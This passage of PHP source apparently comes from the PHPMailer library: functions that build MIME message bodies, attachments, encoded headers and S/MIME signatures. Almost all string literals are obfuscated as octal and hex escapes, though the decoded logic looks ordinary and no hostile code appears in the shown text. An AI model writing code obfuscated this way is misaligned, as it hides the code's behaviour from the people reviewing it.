$result .= $this->textLine("\40\142\x6f\x75\156\144\x61\x72\x79\x3d\x22" . $this->boundary[1] . "\42"); break; default: $result .= $this->textLine("\103\157\156\x74\x65\x6e\x74\55\124\x79\x70\x65\72\40" . $this->ContentType . "\73\x20\x63\150\x61\x72\x73\145\164\x3d" . $this->CharSet); $ismultipart = false; break; } if (static::ENCODING_7BIT !== $this->Encoding) { if ($ismultipart) { if (static::ENCODING_8BIT === $this->Encoding) { $result .= $this->headerLine("\103\157\156\x74\x65\x6e\164\55\x54\x72\141\x6e\x73\x66\145\x72\55\105\x6e\x63\157\144\151\156\x67", static::ENCODING_8BIT); } } else { $result .= $this->headerLine("\103\x6f\x6e\x74\x65\x6e\164\x2d\124\162\x61\x6e\163\x66\145\x72\x2d\105\x6e\143\x6f\x64\151\x6e\x67", $this->Encoding); } } return $result; } public function getSentMIMEMessage() { return static::stripTrailingWSP($this->MIMEHeader . $this->mailHeader) . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $len = 32; $bytes = ''; if (function_exists("\x72\x61\x6e\x64\157\155\137\142\x79\x74\x65\163")) { try { $bytes = random_bytes($len); } catch (\Exception $e) { } } elseif (function_exists("\157\x70\145\156\x73\x73\154\137\162\141\x6e\144\157\x6d\x5f\160\x73\145\165\144\x6f\137\x62\171\x74\145\163")) { $bytes = openssl_random_pseudo_bytes($len); } if ($bytes === '') { $bytes = hash("\163\x68\x61\x32\x35\66", uniqid((string) mt_rand(), true), true); } return str_replace(array("\75", "\53", "\x2f"), '', base64_encode(hash("\163\150\141\x32\x35\66", $bytes, true))); } public function createBody() { $body = ''; $this->setBoundaries(); if ($this->sign_key_file) { $body .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $bodyEncoding = $this->Encoding; $bodyCharSet = $this->CharSet; if ($this->UseSMTPUTF8) { $bodyEncoding = static::ENCODING_8BIT; } elseif (static::ENCODING_8BIT === $bodyEncoding && !$this->has8bitChars($this->Body)) { $bodyEncoding = static::ENCODING_7BIT; $bodyCharSet = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $this->Encoding && static::hasLineLongerThanMax($this->Body)) { $bodyEncoding = static::ENCODING_QUOTED_PRINTABLE; } $altBodyEncoding = $this->Encoding; $altBodyCharSet = $this->CharSet; if (static::ENCODING_8BIT === $altBodyEncoding && !$this->has8bitChars($this->AltBody)) { $altBodyEncoding = static::ENCODING_7BIT; $altBodyCharSet = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $altBodyEncoding && static::hasLineLongerThanMax($this->AltBody)) { $altBodyEncoding = static::ENCODING_QUOTED_PRINTABLE; } $mimepre = ''; switch ($this->message_type) { case "\x69\156\154\x69\156\145": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\151\x6e\154\x69\156\x65", $this->boundary[1]); break; case "\141\x74\164\141\143\150": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\141\164\164\x61\143\x68\x6d\145\x6e\x74", $this->boundary[1]); break; case "\151\x6e\x6c\x69\156\x65\137\141\x74\164\x61\143\x68": $body .= $mimepre; $body .= $this->textLine("\55\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\157\156\164\145\x6e\x74\x2d\124\171\160\x65", static::CONTENT_TYPE_MULTIPART_RELATED . "\x3b"); $body .= $this->textLine("\x20\x62\x6f\165\156\x64\x61\x72\171\75\x22" . $this->boundary[2] . "\42\x3b"); $body .= $this->textLine("\40\x74\x79\x70\145\75\x22" . static::CONTENT_TYPE_TEXT_HTML . "\42"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\151\x6e\154\x69\x6e\x65", $this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\141\164\164\x61\143\150\x6d\x65\x6e\164", $this->boundary[1]); break; case "\141\x6c\164": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; if (!empty($this->Ical)) { $method = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $imethod) { if (stripos($this->Ical, "\115\105\x54\110\117\x44\72" . $imethod) !== false) { $method = $imethod; break; } } $body .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . "\73\40\x6d\145\164\x68\x6f\x64\75" . $method, ''); $body .= $this->encodeString($this->Ical, $this->Encoding); $body .= static::$LE; } $body .= $this->endBoundary($this->boundary[1]); break; case "\141\154\x74\137\151\156\154\151\x6e\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\156\164\145\156\x74\x2d\124\x79\160\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\73"); $body .= $this->textLine("\40\142\157\x75\x6e\x64\x61\x72\x79\x3d\x22" . $this->boundary[2] . "\42\x3b"); $body .= $this->textLine("\x20\164\x79\160\x65\75\x22" . static::CONTENT_TYPE_TEXT_HTML . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\151\156\x6c\x69\156\145", $this->boundary[2]); $body .= static::$LE; $body .= $this->endBoundary($this->boundary[1]); break; case "\x61\x6c\x74\x5f\141\164\164\x61\x63\150": $body .= $mimepre; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\156\164\x65\156\164\55\x54\171\160\x65", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\73"); $body .= $this->textLine("\x20\142\157\x75\x6e\144\141\162\171\x3d\42" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; if (!empty($this->Ical)) { $method = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $imethod) { if (stripos($this->Ical, "\x4d\x45\x54\x48\117\104\x3a" . $imethod) !== false) { $method = $imethod; break; } } $body .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . "\x3b\x20\155\145\x74\150\157\x64\x3d" . $method, ''); $body .= $this->encodeString($this->Ical, $this->Encoding); } $body .= $this->endBoundary($this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\x61\x74\x74\x61\x63\x68\155\x65\x6e\164", $this->boundary[1]); break; case "\141\154\164\137\151\x6e\154\151\156\x65\x5f\141\x74\164\x61\x63\150": $body .= $mimepre; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\x6f\156\164\145\156\164\55\x54\x79\x70\x65", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\x3b"); $body .= $this->textLine("\40\x62\157\165\x6e\144\141\162\171\x3d\x22" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->textLine("\x2d\55" . $this->boundary[2]); $body .= $this->headerLine("\103\157\x6e\164\145\156\164\55\124\x79\160\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\73"); $body .= $this->textLine("\40\x62\157\x75\156\x64\x61\x72\x79\x3d\42" . $this->boundary[3] . "\x22\73"); $body .= $this->textLine("\x20\164\x79\x70\145\x3d\x22" . static::CONTENT_TYPE_TEXT_HTML . "\42"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\151\x6e\154\x69\156\x65", $this->boundary[3]); $body .= static::$LE; $body .= $this->endBoundary($this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\x61\164\x74\x61\143\x68\x6d\145\156\x74", $this->boundary[1]); break; default: $this->Encoding = $bodyEncoding; $body .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $body = ''; if ($this->exceptions) { throw new Exception($this->lang("\x65\x6d\x70\x74\171\137\155\145\163\x73\141\x67\x65"), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined("\x50\113\103\x53\67\137\124\x45\130\x54")) { throw new Exception($this->lang("\145\x78\164\145\x6e\x73\x69\157\156\x5f\x6d\151\163\163\x69\156\x67") . "\157\160\x65\x6e\x73\x73\x6c"); } $file = tempnam(sys_get_temp_dir(), "\163\162\x63\163\151\147\x6e"); $signed = tempnam(sys_get_temp_dir(), "\x6d\x61\151\x6c\x73\x69\147\156"); file_put_contents($file, $body); if (empty($this->sign_extracerts_file)) { $sign = @openssl_pkcs7_sign($file, $signed, "\x66\x69\154\145\x3a\x2f\x2f" . realpath($this->sign_cert_file), array("\146\x69\154\145\72\57\x2f" . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $sign = @openssl_pkcs7_sign($file, $signed, "\146\151\154\145\x3a\x2f\x2f" . realpath($this->sign_cert_file), array("\x66\151\x6c\145\72\57\57" . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } @unlink($file); if ($sign) { $body = file_get_contents($signed); @unlink($signed); $parts = explode("\12\xa", $body, 2); $this->MIMEHeader .= $parts[0] . static::$LE . static::$LE; $body = $parts[1]; } else { @unlink($signed); throw new Exception($this->lang("\163\151\147\156\151\x6e\147") . openssl_error_string()); } } catch (Exception $exc) { $body = ''; if ($this->exceptions) { throw $exc; } } } return $body; } public function getBoundaries() { if (empty($this->boundary)) { $this->setBoundaries(); } return $this->boundary; } protected function getBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if ('' === $charSet) { $charSet = $this->CharSet; } if ('' === $contentType) { $contentType = $this->ContentType; } if ('' === $encoding) { $encoding = $this->Encoding; } $result .= $this->textLine("\55\x2d" . $boundary); $result .= sprintf("\x43\x6f\156\x74\x65\156\164\x2d\x54\171\160\x65\x3a\40\45\163\x3b\x20\x63\x68\x61\162\x73\145\x74\75\45\x73", $contentType, $charSet); $result .= static::$LE; if (static::ENCODING_7BIT !== $encoding) { $result .= $this->headerLine("\103\x6f\x6e\x74\145\x6e\164\x2d\x54\x72\x61\156\163\x66\145\162\x2d\105\x6e\143\x6f\144\x69\156\x67", $encoding); } $result .= static::$LE; return $result; } protected function endBoundary($boundary) { return static::$LE . "\55\55" . $boundary . "\x2d\55" . static::$LE; } protected function setMessageType() { $type = array(); if ($this->alternativeExists()) { $type[] = "\141\x6c\164"; } if ($this->inlineImageExists()) { $type[] = "\x69\x6e\x6c\151\x6e\145"; } if ($this->attachmentExists()) { $type[] = "\x61\x74\x74\x61\143\150"; } $this->message_type = implode("\137", $type); if ('' === $this->message_type) { $this->message_type = "\160\x6c\x61\x69\x6e"; } } public function headerLine($name, $value) { return $name . "\72\x20" . $value . static::$LE; } public function textLine($value) { return $value . static::$LE; } public function addAttachment($path, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x61\x74\x74\141\x63\x68\x6d\145\156\164") { try { if (!static::fileIsAccessible($path)) { throw new Exception($this->lang("\x66\151\x6c\145\137\x61\x63\x63\145\x73\163") . $path, self::STOP_CONTINUE); } if ('' === $type) { $type = static::filenameToType($path); } $filename = (string) static::mb_pathinfo($path, PATHINFO_BASENAME); if ('' === $name) { $name = $filename; } if (!$this->validateEncoding($encoding)) { throw new Exception($this->lang("\x65\156\x63\x6f\144\x69\156\x67") . $encoding); } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $name); } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($disposition_type, $boundary) { $mime = array(); $cidUniq = array(); $incl = array(); foreach ($this->attachment as $attachment) { if ($attachment[6] === $disposition_type) { $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) { $string = $attachment[0]; } else { $path = $attachment[0]; } $inclhash = hash("\x73\x68\x61\x32\x35\66", serialize($attachment)); if (in_array($inclhash, $incl, true)) { continue; } $incl[] = $inclhash; $name = $attachment[2]; $encoding = $attachment[3]; $type = $attachment[4]; $disposition = $attachment[6]; $cid = $attachment[7]; if ("\x69\156\154\x69\156\145" === $disposition && array_key_exists($cid, $cidUniq)) { continue; } $cidUniq[$cid] = true; $mime[] = sprintf("\55\55\x25\x73\x25\x73", $boundary, static::$LE); if (!empty($name)) { $mime[] = sprintf("\x43\157\x6e\164\x65\156\x74\x2d\x54\171\x70\145\x3a\x20\45\163\x3b\40\x6e\141\155\145\x3d\45\x73\x25\x73", $type, static::quotedString($this->encodeHeader($this->secureHeader($name))), static::$LE); } else { $mime[] = sprintf("\103\x6f\x6e\x74\x65\156\164\x2d\x54\x79\x70\145\72\x20\x25\163\45\163", $type, static::$LE); } if (static::ENCODING_7BIT !== $encoding) { $mime[] = sprintf("\103\157\x6e\164\145\x6e\164\55\124\x72\141\x6e\x73\146\145\162\55\x45\x6e\x63\x6f\x64\151\156\147\72\x20\x25\x73\45\163", $encoding, static::$LE); } if ((string) $cid !== '' && $disposition === "\x69\156\154\x69\156\x65") { $mime[] = "\x43\157\x6e\164\x65\156\x74\x2d\x49\x44\x3a\40\74" . $this->encodeHeader($this->secureHeader($cid)) . "\x3e" . static::$LE; } if (!empty($disposition)) { $encoded_name = $this->encodeHeader($this->secureHeader($name)); if (!empty($encoded_name)) { $mime[] = sprintf("\103\157\x6e\164\145\x6e\x74\x2d\104\151\163\160\x6f\163\151\x74\x69\x6f\x6e\x3a\x20\x25\x73\x3b\40\146\151\x6c\x65\x6e\141\x6d\145\75\x25\x73\x25\163", $disposition, static::quotedString($encoded_name), static::$LE . static::$LE); } else { $mime[] = sprintf("\103\157\156\164\x65\x6e\x74\x2d\x44\x69\x73\160\x6f\163\151\164\151\157\156\x3a\40\45\163\45\163", $disposition, static::$LE . static::$LE); } } else { $mime[] = static::$LE; } if ($bString) { $mime[] = $this->encodeString($string, $encoding); } else { $mime[] = $this->encodeFile($path, $encoding); } if ($this->isError()) { return ''; } $mime[] = static::$LE; } } $mime[] = sprintf("\55\55\45\163\55\x2d\45\x73", $boundary, static::$LE); return implode('', $mime); } protected function encodeFile($path, $encoding = self::ENCODING_BASE64) { try { if (!static::fileIsAccessible($path)) { throw new Exception($this->lang("\x66\x69\154\145\137\157\160\145\156") . $path, self::STOP_CONTINUE); } $file_buffer = file_get_contents($path); if (false === $file_buffer) { throw new Exception($this->lang("\x66\x69\x6c\145\137\157\x70\x65\156") . $path, self::STOP_CONTINUE); } $file_buffer = $this->encodeString($file_buffer, $encoding); return $file_buffer; } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return ''; } } public function encodeString($str, $encoding = self::ENCODING_BASE64) { $encoded = ''; switch (strtolower($encoding)) { case static::ENCODING_BASE64: $encoded = chunk_split(base64_encode($str), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $encoded = static::normalizeBreaks($str); if (substr($encoded, -strlen(static::$LE)) !== static::$LE) { $encoded .= static::$LE; } break; case static::ENCODING_BINARY: $encoded = $str; break; case static::ENCODING_QUOTED_PRINTABLE: $encoded = $this->encodeQP($str); break; default: $this->setError($this->lang("\145\156\143\x6f\x64\151\156\147") . $encoding); if ($this->exceptions) { throw new Exception($this->lang("\x65\x6e\143\x6f\144\x69\x6e\x67") . $encoding); } break; } return $encoded; } public function encodeHeader($str, $position = "\x74\x65\x78\164") { $position = strtolower($position); if ($this->UseSMTPUTF8 && !("\143\x6f\155\155\x65\x6e\164" === $position)) { return trim(static::normalizeBreaks($str)); } $matchcount = 0; switch (strtolower($position)) { case "\x70\x68\162\141\163\x65": if (!preg_match("\x2f\133\x5c\x32\x30\60\x2d\x5c\63\x37\x37\135\x2f", $str)) { $encoded = addcslashes($str, "\0\x2e\56\x1f\177\x5c\x22"); if ($str === $encoded && !preg_match("\57\x5b\136\101\x2d\132\141\55\172\x30\x2d\71\41\x23\x24\x25\x26\x27\x2a\53\134\57\75\x3f\x5e\x5f\x60\x7b\174\175\x7e\40\55\x5d\x2f", $str)) { return $encoded; } return "\x22{$encoded}\x22"; } $matchcount = preg_match_all("\57\133\136\134\x30\x34\x30\134\60\x34\x31\134\x30\x34\x33\x2d\x5c\61\x33\x33\x5c\x31\63\x35\55\x5c\x31\67\66\x5d\x2f", $str, $matches); break; case "\x63\x6f\155\155\145\156\164": $matchcount = preg_match_all("\57\133\50\x29\x22\x5d\x2f", $str, $matches); case "\164\145\170\164": default: $matchcount += preg_match_all("\57\x5b\134\60\x30\x30\x2d\134\x30\x31\x30\x5c\x30\x31\x33\134\x30\61\x34\134\60\61\66\x2d\134\60\63\67\x5c\61\67\x37\55\134\63\67\x37\135\x2f", $str, $matches); break; } if ($this->has8bitChars($str)) { $charset = $this->CharSet; } else { $charset = static::CHARSET_ASCII; } $overhead = 8 + strlen($charset); if ("\x6d\141\x69\x6c" === $this->Mailer) { $maxlen = static::MAIL_MAX_LINE_LENGTH - $overhead; } else { $maxlen = static::MAX_LINE_LENGTH - $overhead; } if ($matchcount > strlen($str) / 3) { $encoding = "\102"; } elseif ($matchcount > 0) { $encoding = "\x51"; } elseif (strlen($str) > $maxlen) { $encoding = "\121"; } else { $encoding = false; } switch ($encoding) { case "\102": if ($this->hasMultiBytes($str)) { $encoded = $this->base64EncodeWrapMB($str, "\xa"); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\xa")); } $encoded = preg_replace("\57\x5e\x28\x2e\52\x29\44\x2f\155", "\40\x3d\x3f" . $charset . "\x3f{$encoding}\x3f\x5c\61\x3f\75", $encoded); break; case "\x51": $encoded = $this->encodeQ($str, $position); $encoded = $this->wrapText($encoded, $maxlen, true); $encoded = str_replace("\75" . static::$LE, "\xa", trim($encoded)); $encoded = preg_replace("\x2f\136\x28\56\x2a\51\44\57\155", "\x20\75\x3f" . $charset . "\x3f{$encoding}\77\x5c\x31\77\75", $encoded); break; default: return $str; } return trim(static::normalizeBreaks($encoded)); } public function hasMultiBytes($str) { if (function_exists("\155\142\x5f\163\164\162\x6c\145\156")) { return strlen($str) > mb_strlen($str, $this->CharSet); } return false; } public function has8bitChars($text) { return (bool) preg_match("\57\133\134\x78\70\60\x2d\x5c\170\106\x46\x5d\57", $text); } public function base64EncodeWrapMB($str, $linebreak = null) { $start = "\x3d\x3f" . $this->CharSet . "\x3f\x42\x3f"; $end = "\x3f\75"; $encoded = ''; if (null === $linebreak) { $linebreak = static::$LE; } $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $avgLength = floor($length * $ratio * 0.75); $offset = 0; for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); ++$lookBack; } while (strlen($chunk) > $length); $encoded .= $chunk . $linebreak; } return substr($encoded, 0, -strlen($linebreak)); } public function encodeQP($string) { return static::normalizeBreaks(quoted_printable_encode($string)); } public function encodeQ($str, $position = "\164\145\x78\x74") { $pattern = ''; $encoded = str_replace(array("\15", "\12"), '', $str); switch (strtolower($position)) { case "\x70\x68\162\x61\163\145": $pattern = "\x5e\101\55\x5a\141\x2d\x7a\x30\x2d\71\x21\52\x2b\x5c\57\40\55"; break; case "\143\x6f\x6d\155\145\156\164": $pattern = "\134\x28\x5c\x29\42"; case "\x74\145\170\164": default: $pattern = "\134\60\x30\x30\x2d\x5c\60\61\x31\134\x30\61\x33\134\x30\61\64\134\60\61\66\55\x5c\x30\63\x37\134\x30\67\x35\x5c\60\67\x37\134\61\x33\x37\134\61\67\x37\55\x5c\x33\x37\x37" . $pattern; break; } $matches = array(); if (preg_match_all("\57\133{$pattern}\135\57", $encoded, $matches)) { $eqkey = array_search("\x3d", $matches[0], true); if (false !== $eqkey) { unset($matches[0][$eqkey]); array_unshift($matches[0], "\x3d"); } foreach (array_unique($matches[0]) as $char) { $encoded = str_replace($char, "\x3d" . sprintf("\x25\60\x32\x58", ord($char)), $encoded); } } return str_replace("\x20", "\x5f", $encoded); } public function addStringAttachment($string, $filename, $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\141\164\164\x61\x63\x68\155\x65\156\164") { try { if ('' === $type) { $type = static::filenameToType($filename); } if (!$this->validateEncoding($encoding)) { throw new Exception($this->lang("\x65\x6e\x63\x6f\144\151\156\x67") . $encoding); } $this->attachment[] = array(0 => $string, 1 => $filename, 2 => static::mb_pathinfo($filename, PATHINFO_BASENAME), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0); } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function addEmbeddedImage($path, $cid, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\151\x6e\154\x69\x6e\x65") { try { if (!static::fileIsAccessible($path)) { throw new Exception($this->lang("\146\151\154\x65\137\141\143\x63\x65\163\163") . $path, self::STOP_CONTINUE); } if ('' === $type) { $type = static::filenameToType($path); } if (!$this->validateEncoding($encoding)) { throw new Exception($this->lang("\x65\x6e\143\157\144\x69\156\x67") . $encoding); } $filename = (string) static::mb_pathinfo($path, PATHINFO_BASENAME); if ('' === $name) { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid); } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x69\x6e\x6c\151\x6e\x65") { try { if ('' === $type && !empty($name)) { $type = static::filenameToType($name); } if (!$this->validateEncoding($encoding)) { throw new Exception($this->lang("\145\156\143\x6f\144\151\156\x67") . $encoding); } $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid); } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } protected function validateEncoding($encoding) { return in_array($encoding, array(self::ENCODING_7BIT, self::ENCODING_QUOTED_PRINTABLE, self::ENCODING_BASE64, self::ENCODING_8BIT, self::ENCODING_BINARY), true); } protected function cidExists($cid) { foreach ($this->attachment as $attachment) { if ("\151\156\x6c\x69\x6e\145" === $attachment[6] && $cid === $attachment[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $attachment) { if ("\151\156\x6c\x69\x6e\x65" === $attachment[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $attachment) { if ("\x61\164\x74\x61\x63\x68\x6d\x65\156\164" === $attachment[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($kind) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, static function ($params) use($kind) { return $params[0] !== $kind; }); } public function clearAddresses() { foreach ($this->to as $to) { unset($this->all_recipients[strtolower($to[0])]); } $this->to = array(); $this->clearQueuedAddresses("\x74\157"); } public function clearCCs() { foreach ($this->cc as $cc) { unset($this->all_recipients[strtolower($cc[0])]); } $this->cc = array(); $this->clearQueuedAddresses("\x63\143"); } public function clearBCCs() { foreach ($this->bcc as $bcc) { unset($this->all_recipients[strtolower($bcc[0])]); } $this->bcc = array(); $this->clearQueuedAddresses("\142\143\143"); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } public function clearCustomHeader($name, $value = null) { if (null === $value && strpos($name, "\x3a") !== false) { list($name, $value) = explode("\72", $name, 2); } $name = trim($name); $value = null === $value ? null : trim($value); foreach ($this->CustomHeader as $k => $pair) { if ($pair[0] == $name) { if (null === $value || $pair[1] == $value) { unset($this->CustomHeader[$k]); } } } return true; } public function replaceCustomHeader($name, $value = null) { if (null === $value && strpos($name, "\x3a") !== false) { list($name, $value) = explode("\x3a", $name, 2); } $name = trim($name); $value = null === $value ? '' : trim($value); $replaced = false; foreach ($this->CustomHeader as $k => $pair) { if ($pair[0] == $name) { if ($replaced) { unset($this->CustomHeader[$k]); continue; } if (strpbrk($name . $value, "\15\xa") !== false) { if ($this->exceptions) { throw new Exception($this->lang("\x69\x6e\166\x61\x6c\x69\144\x5f\150\145\141\x64\145\162")); } return false; } $this->CustomHeader[$k] = array($name, $value); $replaced = true; } } return true; } protected function setError($msg) { ++$this->error_count; if ("\163\155\164\160" === $this->Mailer && null !== $this->smtp) { $lasterror = $this->smtp->getError(); if (!empty($lasterror["\x65\162\162\157\162"])) { $msg .= "\x20" . $this->lang("\x73\x6d\x74\x70\137\x65\x72\162\157\x72") . $lasterror["\x65\162\162\157\162"]; if (!empty($lasterror["\144\145\164\x61\151\154"])) { $msg .= "\x20" . $this->lang("\163\x6d\x74\160\137\144\x65\x74\141\x69\x6c") . $lasterror["\144\x65\x74\141\151\x6c"]; } if (!empty($lasterror["\x73\x6d\x74\160\x5f\143\157\x64\145"])) { $msg .= "\x20" . $this->lang("\x73\155\x74\160\x5f\143\157\144\x65") . $lasterror["\x73\x6d\164\160\137\143\x6f\144\145"]; } if (!empty($lasterror["\163\x6d\164\160\137\x63\x6f\144\x65\137\x65\170"])) { $msg .= "\x20" . $this->lang("\x73\x6d\164\160\137\x63\x6f\x64\145\x5f\x65\x78") . $lasterror["\x73\155\164\x70\x5f\x63\157\x64\x65\137\x65\x78"]; } } } $this->ErrorInfo = $msg; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date("\x44\54\x20\152\x20\115\x20\x59\40\x48\72\x69\72\x73\40\117"); } protected function serverHostname() { $result = ''; if (!empty($this->Hostname)) { $result = $this->Hostname; } elseif (isset($_SERVER) && array_key_exists("\123\x45\x52\126\x45\x52\x5f\x4e\101\x4d\105", $_SERVER)) { $result = $_SERVER["\x53\x45\x52\126\x45\x52\137\x4e\x41\x4d\x45"]; } elseif (function_exists("\x67\x65\164\x68\157\163\164\156\141\x6d\x65") && gethostname() !== false) { $result = gethostname(); } elseif (php_uname("\x6e") !== '') { $result = php_uname("\156"); } if (!static::isValidHost($result)) { return "\x6c\x6f\x63\141\154\150\x6f\163\x74\56\154\x6f\143\141\x6c\x64\x6f\x6d\141\151\156"; } return $result; } public static function isValidHost($host) { if (empty($host) || !is_string($host) || strlen($host) > 256 || !preg_match("\x2f\136\x28\133\x61\x2d\172\x5c\144\56\55\135\x2a\x7c\134\133\x5b\141\55\146\x5c\x64\72\135\53\134\x5d\51\x24\57\x69", $host)) { return false; } if (strlen($host) > 2 && substr($host, 0, 1) === "\133" && substr($host, -1, 1) === "\x5d") { return filter_var(substr($host, 1, -1), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false; } if (is_numeric(str_replace("\x2e", '', $host))) { return filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false; } return filter_var("\150\164\164\x70\x73\x3a\x2f\x2f" . $host, FILTER_VALIDATE_URL) !== false; } protected function addressHasUnicodeLocalPart($address) { return (bool) preg_match("\x2f\x5b\x5c\170\x38\x30\x2d\134\170\106\x46\x5d\56\x2a\x40\57", $address); } protected function anyAddressHasUnicodeLocalPart($addresses) { foreach ($addresses as $address) { if (is_array($address)) { $address = $address[0]; } if ($this->addressHasUnicodeLocalPart($address)) { return true; } } return false; } public function needsSMTPUTF8() { return $this->UseSMTPUTF8; } protected function lang($key) { if (count($this->language) < 1) { $this->setLanguage(); } if (array_key_exists($key, $this->language)) { if ("\x73\x6d\164\160\x5f\x63\157\x6e\156\145\143\164\x5f\x66\141\x69\x6c\145\x64" === $key) { return $this->language[$key] . 